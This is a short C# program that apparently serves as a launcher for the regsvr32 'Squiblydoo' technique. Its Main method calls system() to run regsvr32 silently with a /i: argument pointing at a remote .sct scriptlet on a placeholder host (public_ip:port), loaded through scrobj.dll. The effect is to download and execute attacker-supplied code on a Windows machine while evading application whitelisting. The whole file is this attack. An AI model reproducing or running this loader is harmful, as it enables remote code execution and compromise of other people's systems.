using System;
using System.Runtime.InteropServices;

namespace Regsvr

{ public class CMD
	{ [DllImport("msvcrt.dll")]
		public static extern int system(string cmd);
		public static void Main()
		{ system("regsvr32 /s /n /u /i:http://public_ip:port/file.sct scrobj.dll");
		}}}